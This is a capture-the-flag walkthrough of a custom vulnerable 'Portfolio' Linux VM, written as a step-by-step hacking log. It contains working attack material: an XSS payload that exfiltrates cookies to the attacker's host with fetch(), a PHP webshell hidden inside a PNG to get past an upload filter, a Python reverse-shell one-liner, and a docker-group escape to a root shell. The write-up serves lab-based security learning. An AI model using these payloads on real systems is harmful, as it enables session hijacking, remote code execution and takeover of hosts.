---
title: "ch3ckm8 RoboGRoot's Portfolio"
has_toc: true
---

* TOC
{:toc}

# Intro

This is a linux machine, custom made by my friend RoboGR00t 
![Pasted image 20250512003425](MediaFiles/Pasted%20image%2020250512003425.png)

Description:
```
A passionate web developer recently launched his personal portfolio website, proudly displaying his projects and sharing his thoughts through a vibrant blog. His focus on design and functionality has left glaring security holes.

As his blog gains popularity, you, a skilled hacker, spot the perfect target. Your mission is clear: exploit the vulnerabilities, compromise his site, and expose his negligence. Every weakness is an opportunity, every oversight a path to control.

In this CTF challenge, you are the hacker. Uncover the flaws, break through the defenses, and leave your mark on the developer’s digital pride.

Welcome to "Portfolio CTF" The game is on. Good luck!
```

Tags: #linux #WebApp #XSS #RCE #Docker
Tools used: 
netdiscover
Dirbuster
gobuster

CTF link: https://www.less-secure.com/2024/07/ctf-portfolio-walkthrough.html

--------
# Vmware setup

First things first, download the .ova file, import it on vmware.
Next, both on  vulnerable machine, set the network to "Host only", which puts it in a private network . Then the vulnerable host will be discoverable from our attacker machine and we can move on.
The attacker machine is connected to NAT network option.

-----------
##### First, lets find our ip address (inet)
```bash
ifconfig
```

```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 192.168.111.129  netmask 255.255.255.0  broadcast 192.168.111.255
inet6 fe80::9ece:1e2d:11bd:668f  prefixlen 64  scopeid 0x20<link>
ether 00:0c:29:ee:33:58  txqueuelen 1000  (Ethernet)
RX packets 65605  bytes 3949265 (3.7 MiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 66132  bytes 3978396 (3.7 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
###### we get the subnet from inet (192.168.111.xxx), and then search the network to find the vulnerable machine:
```bash
sudo nmap -sn -vvv -T5 192.168.111.1/24 # 192.168.194.X replace with your NAT network
```
this will output some hosts to be up, after some trial and error i found that the vulnerable machine has the ip address 192.168.111.128 

# Reconnaissance

###### lets start with searching for open ports
```bash
nmap -p- --open -T4 192.168.111.128
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 17:55 EDT
Nmap scan report for 192.168.111.128
Host is up (0.00074s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 00:0C:29:20:0A:ED (VMware)

Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds
```

What we can see here is that 3 ports are open
- 22 -> SSH service
- 80 -> HTTP service
- 443 -> HTTPs service

Lets narrow it down even further, and try finding information about the services of each open port:
```bash
nmap -p22,80,443 -sCV -T4 192.168.111.128
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 18:05 EDT
Nmap scan report for 192.168.111.128
Host is up (0.00028s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d5:9d:f8:aa:c9:ba:36:92:ab:de:ae:b6:a3:b4:2e:6d (ECDSA)
|_  256 d3:61:f9:e6:5d:79:4d:45:5f:2b:21:2f:78:92:06:30 (ED25519)
80/tcp  open  http     Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://portfolio.local/
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.52
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-11-05T04:24:05
|_Not valid after:  2024-11-04T04:24:05
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://portfolio.local/
MAC Address: 00:0C:29:20:0A:ED (VMware)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

As we can see, we get important information about the open services, for example the apache version, lets continue
And since we have no info about ssh creds, the only way would be to try http first.

lets add the host to the /etc/hosts

```bash
echo "192.168.111.128   portfolio.local" | sudo tee -a /etc/hosts
```

now we can navigate through the web app, go to our browser
![Pasted image 20250509010928](MediaFiles/Pasted%20image%2020250509010928.png)
great! its accessbile, now lets investigate further and gather more information about it

### Web app Enumeration
#### Directory, file and subdomain enumeration
One way to move further, would be to search for subdomains, lets use Dirbuster for this
![Pasted image 20250511165341](MediaFiles/Pasted%20image%2020250511165341.png)
hit start, and let it run, it will take some time according to your hardware, and the number of assigned threads.

Finally, the output from Dirbuster gives us this
```bash
--------------------------------
http://portfolio.local:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:
/img/
/
/src/

Dirs found with a 403 response:
/icons/
/icons/small/
/server-status/
--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.html
/about.html
/projects.html
/experience.html
/skills.html
/contact.html
/src/style.css
/send.php
--------------------------------
```

hm after searching these pages, i found the following:
- ==/img/== has the jpeg used in the homepage
![Pasted image 20250511174233](MediaFiles/Pasted%20image%2020250511174233.png)

- ==/src/style.css== has nothing interesting,
also the rest of them are pages with irrelevant information

- ==contact.html==
So the rest of the pages have no points of interest, except the ==contact.html== page, which appears to have some sort of contact form containing text boxes and text areas.

By opening the source of the page, we can see that the contact form section, uses the send.php via post method:
```html
<!-- Contact Page Content -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Contact Me</title>
    <link rel="stylesheet" href="src/style.css">
</head>
<body class="body">
    <nav>
        <ul class="nav_ul">
            <li class="nav_li"><a href="index.html">Home</a></li>
            <li class="nav_li"><a href="about.html">About</a></li>
            <li class="nav_li"><a href="projects.html">Projects</a></li>
            <li class="nav_li"><a href="experience.html">Experience</a></li>
            <li class="nav_li"><a href="skills.html">Skills</a></li>
            <li class="nav_li"><a href="contact.html">Contact</a></li>
        </ul>
    </nav>
<header class="contact_header">
    <h1>Contact Me</h1>
</header>

<div class="contact_content">
<section class="contact_info">
    <h2>Contact Information</h2>
    <p class="email">
        <span class="w_email">Email:</span> gpapadopoulos@portfolio.local
        <br>
    </p>
    <p class="phone">
        <span class="w_phone">Phone:</span> +123-456-7890
        <br>
    </p>
</section>
<section class="contact_form">
    <h2>Tell Me Your Ideas</h2>
    <form action="send.php" method="post">
        <label for="name"></label>
        <input class="input" placeholder="Name" type="text" id="name" name="name" required><br>

        <label for="email"></label>
        <input class="input" placeholder="Email" type="email" id="email" name="email" required><br>

        <label for="message"></label>
        <textarea class="input textarea" placeholder="Message" id="message" name="message"  required></textarea><br>

        <button class="form_button" type="submit">Send Message</button>
    </form>
</section>
</div>
</body>
</html>
<!--Todo: add link for blog.portfolio.local -->
```

but what appears valuable is the fact that in the end of the source code there is a comment indicating the presence of a subdomain called: ==blog.portfolio.local==

BUT, lets assume the comment wasnt there, and i wanted to search for subdomains, having no clues or hints about them.
#### Subdomain enumeration

since directory and file scan did not provide anything usefull, lets now move on to search for subdomains, using gobuster.

first i needed to download the most commonly used wordlist for subdomain enumeration (subdomains-top1million-5000.txt)

in general, to find subdomains using gobuster you use this command:
```shell
gobuster dns -d <domain> -w /usr/share/wordlists/subdomains/top5000subdomains -i –wildcard
```

for this machine, i used this:
```bash
gobuster dns -q -r 8.8.8.8 -d portfolio.local -w subdomains-top1million-5000.txt -t 4 --delay 1s -o results.txt 
```
after a while i got this result, and it appears that no other subdomains were found by gobuster:
```bash
Found: blog.portfolio.local
```
now lets add it in etc/hosts and browser it
```bash
echo "192.168.111.128 blog.portfolio.local" | sudo tee -a /etc/hosts
```
we come across this page:
![Pasted image 20250509012701](MediaFiles/Pasted%20image%2020250509012701.png)

now lets do again directory and file enumeration but for this subdomain, like we did for portfolio.local with Dirbuster, lets use gobuster this time (more convenient for me)
#### Directory and file enumeration for the subdomain
```bash
gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u blog.portfolio.local
```
and got this output:
```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://blog.portfolio.local/.php                 (Status: 403) [Size: 285]
http://blog.portfolio.local/.html                (Status: 403) [Size: 285]
http://blog.portfolio.local/index.php            (Status: 200) [Size: 3415]
http://blog.portfolio.local/img                  (Status: 301) [Size: 326] [--> http://blog.portfolio.local/img/]
http://blog.portfolio.local/login.php            (Status: 200) [Size: 639]
http://blog.portfolio.local/admin.php            (Status: 302) [Size: 0] [--> login.php]
http://blog.portfolio.local/post.php             (Status: 200) [Size: 785]
http://blog.portfolio.local/upload.php           (Status: 200) [Size: 0]
http://blog.portfolio.local/src                  (Status: 301) [Size: 326] [--> http://blog.portfolio.local/src/]
http://blog.portfolio.local/logout.php           (Status: 302) [Size: 0] [--> index.php]
http://blog.portfolio.local/background           (Status: 301) [Size: 333] [--> http://blog.portfolio.local/background/]
http://blog.portfolio.local/config.php           (Status: 200) [Size: 0]
http://blog.portfolio.local/.php                 (Status: 403) [Size: 285]
http://blog.portfolio.local/.html                (Status: 403) [Size: 285]
http://blog.portfolio.local/server-status        (Status: 403) [Size: 285]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

We see multiple pages here, lets start inspecting:
- ==/img/== and ==/background== contains the imgs used, nothing interesting
![Pasted image 20250511183027](MediaFiles/Pasted%20image%2020250511183027.png)
- /src/ contains the css styles for multiple pages
- config.php, upload.php, logout.php appear not accessible
- login.php and admin.php

Lets inspect the ==login.php== page: (also admin.php redirects to login.php)
![Pasted image 20250509012817](MediaFiles/Pasted%20image%2020250509012817.png)

- post.php
and then i also found a page where it seems that you can write a post and publish it
![Pasted image 20250509012855](MediaFiles/Pasted%20image%2020250509012855.png)

Hm, so what now?
We found 2 pages (login , post), that there is a high possibility to be vulnerable, because they expect input from the user.

So, for the login page, we could check if SQL injection is possible:
##### Checking for SQL injection
username:
```
' OR '1'='1
```
password: anything
-> But no luck, it does not seem to be vulnerable to sql injection, lets focus then on the post page

For the post page, we can search for vulnerabilities, such as XSS
##### Checking for XSS
lets try different tags on the title and content areas, starting by "/script"
```bash
<script>alert('XSS')</script>
```
no luck..., lets try with "img"
```bash
<img src="x" onerror="alert('XSS')"/>
```
no luck..., lets try with "svg"
```bash
<svg xmlns='' onload='alert("XSS")'/>
```

aaaand we get the popup! that means its vulnerable to XSS :)
![Pasted image 20250509013441](MediaFiles/Pasted%20image%2020250509013441.png)

So now that we have found the vulnerability, the reconnaisanse stage stops, lets move on to the foothold

# Foothold

So now we know that post.php page is vulnerable to ==XSS==, but how can we exploit it?

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

Cross-Site Scripting (XSS) attacks occur when:
1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.
https://owasp.org/www-community/attacks/xss/

```shell
python3 -m http.server 8080
```

```shell
<svg xmlns='' onload='fetch("http://192.168.111.129:8080/exfil?cookies=" + encodeURIComponent(document.cookie))'/>
```

![Pasted image 20250511232046](MediaFiles/Pasted%20image%2020250511232046.png)
the cookie here is: iha5l02lih8lgrukq0af0bih40 (caution, %3D is =, so take the rest of it)

so take the cookie from your terminal (which you received on localhost), and go to the browser on storage, and change whatever value there with the cookie you received above
![Pasted image 20250511232221](MediaFiles/Pasted%20image%2020250511232221.png)
then just hit login or go to admin.php directly and you are in
![Pasted image 20250511232251](MediaFiles/Pasted%20image%2020250511232251.png)

Great! we got progress here, we managed to reach the admin panel, right here, we see that file upload is possible, and this means only one thing -> SHELL

Right here, it seems to let you change the background image by uploading a picture

So our goal now is to upload a file, that will give us a shell, this can be achieved by webshell and specifically a php one. Here is a simple php webshell that we could use:
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
we then choose file, and then upload, BUT we get the following message:
![Pasted image 20250511232754](MediaFiles/Pasted%20image%2020250511232754.png)
hm.. interesting, this means that we can only upload files with these extensions, so we must find a way to pass the webshell as an image

i found a png image
![Pasted image 20250512001959](MediaFiles/Pasted%20image%2020250512001959.png)
and then did  the following
```bash
cat picture.png webshell.php > picture.png.php
```

and now it seems it has been uploaded successfully!
![Pasted image 20250511233152](MediaFiles/Pasted%20image%2020250511233152.png)

BUT we need to find where is this file we uploaded located, and if you remember from the recon phase, there was the /background directory and the HINT was that the admin panel mentions that the background can be changed 

So here is our file:
![Pasted image 20250511233519](MediaFiles/Pasted%20image%2020250511233519.png)

so now if we click on it
![Pasted image 20250511234333](MediaFiles/Pasted%20image%2020250511234333.png)
we see some output, lets now check if we can run commands via get_cmd (which we specified in the webshell via shell_exec)
![Pasted image 20250511234426](MediaFiles/Pasted%20image%2020250511234426.png)
and we can see, we can run commands, and above was an example of running the whoami command
nice, our webshell worked, lets continue now, 

so for our convenience, it would make more sense if we could get a rev shell

```python
export RHOST="192.168.111.129";export RPORT=9999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

and similarly we placed it here
![Pasted image 20250511234840](MediaFiles/Pasted%20image%2020250511234840.png)
aand we got rev shell
![Pasted image 20250511234933](MediaFiles/Pasted%20image%2020250511234933.png)
stabilizing shell
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
and we are ready to continue
![Pasted image 20250511235112](MediaFiles/Pasted%20image%2020250511235112.png)
#### From www-data to user

Now lets try going from www-data to an actual user
lets see what permission we have now first:
```bash
id
```
output:
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
okay, now lets enumerate the users 
``` bash
cat /etc/passwd
```
output:
```bash
www-data@portfolio:/var/www/html/blog/background$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
webadmin:x:1000:1000:webadmin:/home/webadmin:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
gpapadopoulos:x:1001:1001:Georgios Papadopoulos,,,:/home/gpapadopoulos:/bin/bash
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```
what stands out as an actual user (and not an app or system related looking one), is gpapadopoulos

Moving forward, since we have a shell, lets browse some files and directories, for example:

This is the root directory of the website
![Pasted image 20250511235639](MediaFiles/Pasted%20image%2020250511235639.png)

Lets view something we did not have visivility earlier, like the source code of the some of the .php files

After inspecting them, i found that config.php contains the creds of user gpapadopoulos
```bash
www-data@portfolio:/var/www/html/blog$ cat config.php
<?php

$db_host = 'localhost';
$db_name = 'blog_db';
$db_user = 'gpapadopoulos';
$db_password = 'Ju5t_4_d3v_mak1ng_s0ftwar3';

?>
```
so we can now login as user gpapadopoulos! lets do it via ssh (ssh service is open according to our recon phase)

we are in!
![Pasted image 20250511235955](MediaFiles/Pasted%20image%2020250511235955.png)
user flag found!
```
dd83c5e0ae54a279d2f65d9020541aec
```

# Privilege escalation

since we got foothold, we must check the permisissions it has
![Pasted image 20250512000606](MediaFiles/Pasted%20image%2020250512000606.png)
interesting, it seems that all permissions are related to himself, but he appears to be in a group called docker!

this should be our target, so lets gather information about that group

i also see processes related to docker are being run as root, it might be related somehow with the docker group
```bash
ps aux | grep docker
```
![Pasted image 20250512001155](MediaFiles/Pasted%20image%2020250512001155.png)

lets find more info about this group, for example what files can its members run:
```bash
find / -group docker 2>/dev/null
```
![Pasted image 20250512001336](MediaFiles/Pasted%20image%2020250512001336.png)
```
/run/docker.sock
```
hm interesting, what is this file tho?

with some research, i found that: 
_docker.sock is the UNIX socket that Docker daemon is listening to. Its the interface between Docker clients and the Docker daemon._.

lets check the permissions of this file
```bash
cd /run/docker.sock
ls -la
```
![Pasted image 20250512002953](MediaFiles/Pasted%20image%2020250512002953.png)

its obvious that root user has access to it
- `s`: This is a **Unix domain socket**.
- `rw-rw----`:
    - **Owner (`root`)**: read/write
    - **Group (`docker`)**: read/write
    - **Others**: no access
- `docker.sock` belongs to group `docker`.

with some research i gathered information about this particular docker file:
###### If you can read/write to `/run/docker.sock`, you can:
- Control Docker fully
- Create and run containers
- Mount host filesystems
- Escape containers
- **Gain full root access to the host**

so since user gpapadopoulos is member of the docker group, he must be able to get a root shell via the container itself!
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
and it seems to have worked!
![Pasted image 20250512002354](MediaFiles/Pasted%20image%2020250512002354.png)
now run 
```bash
bash -i
```
and grab the root flag!
```
21e772231c7e3665b6448e6f513def4d
```
PWNED!

-------------
# Summary

Here is the list of the steps simplified, per phase, for future reference and for quick reading: 
#### Reconnaissance
1. netdiscover -> get ip of the vulnerable machine running locally
2. nmap scan -> chose http/https service to focus on
3. **enumerate** directories and files-> found subdomain
4. **enumerate** directories and files of the subdomain-> found page vulnerable to XSS
#### Foothold
1. since the page is vulnerable to XSS, exploit it to get the admin's session cookie
2. after stealing the session cookie, logging as admin shows us the admin page, which has file upload available (but only of image type)
3. crafted webshell and embedded it on any picture, and uploaded
4. got RCE and then rev shell
5. logged in as www-data , from there after searching the directories performed user enumeration and found a username via the etc/shadow
6. as www-data also found that a page config.php had this user's password
7. logged in as user and grabbed the flag
so the foothold path was: websitepage -> XSS -> RCE -> rev shell -> www-data -> user
#### Privesc
1. now that we got foothold, as a user (gpapadopoulos) i found that he is member of a group called docker
2. later i found that group has a type of docker access that allows running commands as root
3. running a specific command to get root shell via the docker container got me the root flag!

------
# Sidenotes

All in all, this custom made machine by RoboGR00t felt like an easy HackTheBox machine, so it can be classified as challenging.

The initial access part involved a multitude of things to enumerate the host and its running webapp. 
The foothold part was kinda straightforward with the use of XSS, and the cookie hijacking could be classified as the most difficult part of the foothold process. Also during the foothold part a webshell could be uploaded by exploiting RCE and using rev shell to get a shell as www-data, and with some search on the directories creds for a user could be found. The privesc part, was somehow straightforward too, exploiting the permissions of the user's group membership to get a root shell.
